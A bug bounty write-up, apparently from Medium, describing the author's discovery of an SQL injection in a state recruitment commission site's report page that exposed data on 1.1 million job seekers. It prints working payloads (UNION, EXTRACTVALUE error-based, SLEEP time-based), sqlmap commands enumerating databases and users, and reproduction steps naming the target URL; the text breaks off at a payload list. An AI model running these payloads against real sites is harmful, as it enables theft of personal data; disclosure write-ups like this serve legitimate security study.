---
title: SQL Injection: How I Secured Personal Information (PII) of 1.1M Job Seekers
url: https://infosecwriteups.com/sql-injection-how-i-secured-personal-information-pii-of-1-1m-job-seekers-7f7c55d11fbc?source=rss----7b722bfd1b8d--bug_bounty
source: Bug Bounty in InfoSec Write-ups on Medium
date: 2024-11-15
fetch_date: 2025-10-06T19:18:20.387584
---

# SQL Injection: How I Secured Personal Information (PII) of 1.1M Job Seekers

[Sitemap](/sitemap/sitemap.xml)

[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F7f7c55d11fbc&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderCollection&%7Estage=mobileNavBar&source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fsql-injection-how-i-secured-personal-information-pii-of-1-1m-job-seekers-7f7c55d11fbc&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

[Medium Logo](https://medium.com/?source=post_page---top_nav_layout_nav-----------------------------------------)

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav------------------)

[Search](https://medium.com/search?source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fsql-injection-how-i-secured-personal-information-pii-of-1-1m-job-seekers-7f7c55d11fbc&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)

[## InfoSec Write-ups](https://infosecwriteups.com/?source=post_page---publication_nav-7b722bfd1b8d-7f7c55d11fbc---------------------------------------)

·

Follow publication

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:76:76/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_sidebar-7b722bfd1b8d-7f7c55d11fbc---------------------------------------)

A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: <https://weekly.infosecwriteups.com/>

Follow publication

# SQL Injection: How I Secured Personal Information (PII) of 1.1M Job Seekers

## This blog discusses the discovery of an SQL Injection vulnerability on State Level Recruitment Commission (SLRC) asset, which was exposing the personal information of 1.1 million job seekers.

[![brutexploiter](https://miro.medium.com/v2/resize:fill:64:64/1*AQkH-uPZwk0RbRsq6WTBoA.jpeg)](https://brutexploiter.medium.com/?source=post_page---byline--7f7c55d11fbc---------------------------------------)

[brutexploiter](https://brutexploiter.medium.com/?source=post_page---byline--7f7c55d11fbc---------------------------------------)

5 min read

·

Nov 14, 2024

--

Listen

Share

Press enter or click to view image in full size

![]()

[https://staterecruit.in](https://staterecruit.in/GrAde_iii_2023)

![]()

Hello, my name is Biraj Baishya, aka brutexploiter. I am an independent security researcher, a full-time bug bounty hunter, and a mechanical engineer.

In this write-up, I will discuss how I discovered an SQL Injection vulnerability and protected the data of approximately 1.1 million job seekers. This vulnerability could have been exploited by cyber attackers, potentially leading to a massive data breach.

Let’s begin… but first, let’s learn some basic terms:

## What is SQL injection (SQLi)?

SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. This can allow an attacker to view data that they are not normally able to retrieve. This might include data that belongs to other users, or any other data that the application can access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application’s content or behavior.

**Read more**: <https://portswigger.net/web-security/sql-injection>

## Discovery Phase**:**

The discovery phase of the vulnerability is quite interesting. I visited <https://staterecruit.in> as a job seeker. Since the government recently announced Grade III and Grade IV jobs, I visited the site and began the job application process. As a security enthusiast, whenever you surf the web, you’re naturally curious about how things work.

After submitting the form, I encountered the acknowledgment page, which seemed fine. However, my first question was: how is the data retrieved from the server? To investigate further, I opened the Developer Tools in Firefox (F12) and navigated to the Network tab. Since I couldn’t see any API calls, I concluded that the `id` parameter is responsible for data retrieval from the database.

```
https://staterecruit.in/GrAde_iii_2023/WebPages/RegReport.php?id={C9A9E5EA-0000-6E67-4340-A4BA4BF20E08}
```

Press enter or click to view image in full size

![]()

<https://staterecruit.in/GrAde_iii_2023/WebPages/RegReport.php?id=>:id

The first thing that came to my mind after seeing the `id` parameter is SQL Injection. Since the `id` parameter is one of the [most common](https://github.com/bugcrowd/HUNT) targets for SQL Injection attacks.

The first thing I did was enter a single quote character `'` and look for errors or other anomalies. Upon entering the single quote character `'`, the server throws a SQL error in response.

***Note***: Sometimes the server won’t show any error message in response. In that case, we have to test for blind SQL Injection.

Press enter or click to view image in full size

![]()

SQL error returned by server

The next thing is to find the number of columns and query the database type and version.

For Finding the columns:

> `ORDER BY 1`
>
> `ORDER BY 2`
>
> `ORDER BY 3` and so on

For querying the database:

![]()

```
' UNION SELECT @@version--
```

To automate the process I have used [sqlmap](https://github.com/sqlmapproject/sqlmap).

[sqlmap](https://github.com/sqlmapproject/sqlmap) is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers.

### sqlmap command:

```
sqlmap -r req.txt --batch --force-ssl --level 5 --risk 3
```

### sqlmap result:

```
Parameter: id (GET)
    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: id=test' AND EXTRACTVALUE(6427,CONCAT(0x5c,0x716a6a6271,(SELECT (ELT(6427=6427,1))),0x717a767a71)) AND 'zBLQ'='zBLQ
    Vector: AND EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'))
```

```
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=test' AND (SELECT 4881 FROM (SELECT(SLEEP(5)))YnXf) AND 'qGsw'='qGsw
    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])    Type: UNION query
    Title: Generic UNION query (NULL) - 10 columns
    Payload: id=test' UNION ALL SELECT CONCAT(0x716a6a6271,0x525a6479634a525071674d6b774a4873775944464259496c6d58585878727246686e6252426a615a,0x717a767a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
    Vector:  UNION ALL SELECT [QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
```

```
sqlmap -r req.txt --batch --force-ssl --level 5 --risk 3 --dbs
```

Press enter or click to view image in full size

![]()

![]()

available databases

```
sqlmap -r req.txt --batch --force-ssl --level 5 --risk 3 --dbs --hostname
```

Press enter or click to view image in full size

![]()

hostname

```
sqlmap -r req.txt --batch --force-ssl --level 5 --risk 3 --dbs --users
```

Press enter or click to view image in full size

![]()

![]()

users

## **Steps to Reproduce:**

1. Open a web browser and navigate to the URL: <https://staterecruit.in/GrAde_iii_2023/WebPages/RegReport.php?id=1>
2. Locate the `id` parameter in the URL.
3. Input single quote character `'`

Observe that the server returns an SQL error.

**Payloads:**

1. [https://staterecruit.in/GrAde\_iii\_2023...